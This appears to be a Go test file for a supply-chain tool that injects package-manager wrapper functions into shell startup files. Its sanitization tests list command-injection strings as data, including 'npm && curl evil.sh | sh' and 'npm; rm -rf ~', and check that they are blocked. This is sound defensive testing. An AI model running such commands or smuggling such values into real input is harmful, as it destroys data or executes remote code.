package supplychain

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestGenerateWrapper_Posix(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"npm"})

	if !strings.Contains(wrapper, markerStart) {
		t.Error("missing start marker")
	}
	if !strings.Contains(wrapper, markerEnd) {
		t.Error("missing end marker")
	}
	if !strings.Contains(wrapper, `supply-chain wrap npm "$@"`) {
		t.Errorf("unexpected wrapper content: %s", wrapper)
	}
}

func TestGenerateWrapper_Fish(t *testing.T) {
	wrapper := GenerateWrapper("fish", []string{"npm"})

	if !strings.Contains(wrapper, "function npm") {
		t.Error("missing fish function declaration")
	}
	if !strings.Contains(wrapper, "supply-chain wrap npm $argv") {
		t.Errorf("unexpected fish wrapper: %s", wrapper)
	}
}

func TestGenerateWrapper_MultiplePMs(t *testing.T) {
	wrapper := GenerateWrapper("zsh", []string{"npm", "npx"})

	if !strings.Contains(wrapper, "npm()") {
		t.Error("missing npm function")
	}
	if !strings.Contains(wrapper, "npx()") {
		t.Error("missing npx function")
	}
}

// TestGenerateWrapper_RejectsUnsafeNames verifies that package-manager names
// containing shell metacharacters are dropped before being interpolated into
// the generated RC script, so a malformed or attacker-influenced name can never
// inject commands into a sourced shell startup file (CWE-78).
func TestGenerateWrapper_RejectsUnsafeNames(t *testing.T) {
	malicious := []string{
		"npm; rm -rf ~",
		"npm`id`",
		"npm$(whoami)",
		"npm && curl evil.sh | sh",
		"npm\nrm -rf /",
		"NPM",       // uppercase not allowed by the identifier rule
		"-npm",      // must start with a letter
		"np m",      // whitespace
		"npm'quote", // embedded quote
	}

	for _, shell := range []string{"bash", "zsh", "fish"} {
		for _, name := range malicious {
			wrapper := GenerateWrapper(shell, []string{name})
			// The only content should be the marker block; the unsafe name must
			// not appear anywhere in the generated script.
			if strings.Contains(wrapper, name) {
				t.Errorf("%s wrapper leaked unsafe PM name %q:\n%s", shell, name, wrapper)
			}
		}
	}
}

// TestGenerateWrapper_KeepsValidAlongsideInvalid ensures sanitization is
// per-entry: a valid PM name is still wrapped even when an unsafe one is present
// in the same list.
func TestGenerateWrapper_KeepsValidAlongsideInvalid(t *testing.T) {
	wrapper := GenerateWrapper("bash", []string{"npm", "evil; rm -rf ~", "pnpm"})

	if !strings.Contains(wrapper, "npm()") {
		t.Error("valid npm wrapper should be present")
	}
	if !strings.Contains(wrapper, "pnpm()") {
		t.Error("valid pnpm wrapper should be present")
	}
	if strings.Contains(wrapper, "rm -rf") {
		t.Errorf("unsafe entry leaked into wrapper:\n%s", wrapper)
	}
}

// TestGenerateWrapper_CapsNameCount verifies that an oversized PM list is
// bounded at maxPMNames so the generated script (and the builder allocating it)
// cannot grow without limit, even via the exported GenerateWrapper entry point.
func TestGenerateWrapper_CapsNameCount(t *testing.T) {
	many := make([]string, maxPMNames+50)
	for i := range many {
		many[i] = "npm"
	}

	got := sanitizePMNames(many)
	if len(got) != maxPMNames {
		t.Errorf("expected sanitizePMNames to cap at %d, got %d", maxPMNames, len(got))
	}

	// The cap must hold through the public wrapper generator too: count the
	// emitted function definitions rather than trusting the helper alone.
	wrapper := GenerateWrapper("bash", many)
	if n := strings.Count(wrapper, "npm()"); n != maxPMNames {
		t.Errorf("expected %d wrapped functions, got %d", maxPMNames, n)
	}
}

func TestInjectAndRemoveFunctions(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	existing := "# existing config\nexport PATH=$PATH:/usr/local/bin\n"
	os.WriteFile(rcFile, []byte(existing), 0o644) //nolint:errcheck,gosec

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	pms := []string{"npm"}

	modified, err := InjectFunctions(shells, pms)
	if err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if len(modified) != 1 {
		t.Fatalf("expected 1 modified, got %d", len(modified))
	}

	content, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	text := string(content)

	if !strings.Contains(text, existing) {
		t.Error("existing content should be preserved")
	}
	if !strings.Contains(text, markerStart) {
		t.Error("marker should be injected")
	}
	if !strings.Contains(text, `supply-chain wrap npm "$@"`) {
		t.Error("wrapper function should be injected")
	}

	// Verify idempotent
	modified2, err := InjectFunctions(shells, pms)
	if err != nil {
		t.Fatalf("second InjectFunctions: %v", err)
	}
	if len(modified2) != 1 {
		t.Fatalf("expected 1 modified on re-inject, got %d", len(modified2))
	}

	content2, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	count := strings.Count(string(content2), markerStart)
	if count != 1 {
		t.Errorf("expected exactly 1 marker block after re-inject, got %d", count)
	}

	// Remove
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}
	if len(removed) != 1 {
		t.Fatalf("expected 1 removed, got %d", len(removed))
	}

	content3, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	text3 := string(content3)
	if strings.Contains(text3, markerStart) {
		t.Error("marker should be removed")
	}
	if !strings.Contains(text3, "export PATH") {
		t.Error("existing content should be preserved after removal")
	}
}

func TestRemoveFunctions_PreservesPermissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix file permissions not supported on Windows")
	}

	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	// Create an RC file with restrictive 0600 permissions, then inject + remove.
	if err := os.WriteFile(rcFile, []byte("# private config\n"), 0o600); err != nil {
		t.Fatalf("write rc: %v", err)
	}

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	if _, err := InjectFunctions(shells, []string{"npm"}); err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if _, err := RemoveFunctions(shells); err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}

	info, err := os.Stat(rcFile)
	if err != nil {
		t.Fatalf("stat: %v", err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("expected RC file mode 0600 to be preserved after removal, got %o", perm)
	}
}

func TestRemoveFunctions_NoBlock(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".zshrc")
	os.WriteFile(rcFile, []byte("# clean file\n"), 0o644) //nolint:errcheck,gosec

	shells := []Shell{{Name: "zsh", RCFile: rcFile}}
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("RemoveFunctions: %v", err)
	}
	if len(removed) != 0 {
		t.Error("should not modify file without marker")
	}
}

func TestRemoveFunctions_MissingFile(t *testing.T) {
	shells := []Shell{{Name: "bash", RCFile: "/tmp/nonexistent-rc-file-test"}}
	removed, err := RemoveFunctions(shells)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(removed) != 0 {
		t.Error("missing file should not be reported as modified")
	}
}

func TestInjectFunctions_CreatesFile(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, "subdir", ".bashrc")

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	modified, err := InjectFunctions(shells, []string{"npm"})
	if err != nil {
		t.Fatalf("InjectFunctions: %v", err)
	}
	if len(modified) != 1 {
		t.Error("should create and modify new file")
	}

	content, _ := os.ReadFile(rcFile) //nolint:gosec // test file from t.TempDir()
	if !strings.Contains(string(content), markerStart) {
		t.Error("new file should contain marker")
	}
}

func TestHasInjection(t *testing.T) {
	tmpDir := t.TempDir()
	rcFile := filepath.Join(tmpDir, ".bashrc")

	os.WriteFile(rcFile, []byte("# empty\n"), 0o644) //nolint:errcheck,gosec
	if HasInjection(rcFile) {
		t.Error("should return false for clean file")
	}

	shells := []Shell{{Name: "bash", RCFile: rcFile}}
	InjectFunctions(shells, []string{"npm"}) //nolint:errcheck,gosec

	if !HasInjection(rcFile) {
		t.Error("should return true after injection")
	}
}

func TestEvalCommand(t *testing.T) {
	cmd := EvalCommand([]string{"npm"})
	if !strings.Contains(cmd, markerStart) {
		t.Error("eval command should contain markers")
	}
	if !strings.Contains(cmd, "npm()") {
		t.Error("eval command should contain npm function")
	}
}
